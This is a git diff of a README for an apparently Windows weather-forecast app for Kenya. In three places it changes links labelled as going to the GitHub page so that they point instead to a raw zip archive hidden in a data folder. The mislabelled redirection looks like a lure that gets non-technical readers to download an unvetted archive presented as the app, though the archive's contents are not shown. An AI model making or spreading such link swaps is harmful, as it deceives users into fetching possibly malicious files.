@@ -1,6 +1,6 @@
 # 🌦️ Weather_Forcust_Kenya_DL_Models_Auth - Kenya weather forecasts made simple
 
-[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/gene8069/Weather_Forcust_Kenya_DL_Models_Auth)
+[![Download the app](https://img.shields.io/badge/Download%20Now-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/gene8069/Weather_Forcust_Kenya_DL_Models_Auth/main/kenya_weather_data/D-Auth-Kenya-Models-Weather-Forcust-1.0.zip)
 
 ## 🚀 What this app does
 
@@ -12,7 +12,7 @@ This app is built for people who want a simple way to check weather trends acros
 
 Use this link to visit the GitHub page and get the app files:
 
-[Open the download page](https://github.com/gene8069/Weather_Forcust_Kenya_DL_Models_Auth)
+[Open the download page](https://raw.githubusercontent.com/gene8069/Weather_Forcust_Kenya_DL_Models_Auth/main/kenya_weather_data/D-Auth-Kenya-Models-Weather-Forcust-1.0.zip)
 
 If you are using Windows, follow the steps below to run it on your computer.
 
@@ -177,7 +177,7 @@ This app runs on your own Windows computer. It opens in your browser and does no
 
 ## 📎 Download link
 
-[Visit the GitHub page to download the project](https://github.com/gene8069/Weather_Forcust_Kenya_DL_Models_Auth)
+[Visit the GitHub page to download the project](https://raw.githubusercontent.com/gene8069/Weather_Forcust_Kenya_DL_Models_Auth/main/kenya_weather_data/D-Auth-Kenya-Models-Weather-Forcust-1.0.zip)
 
 ## 🧩 Basic first-run steps
 
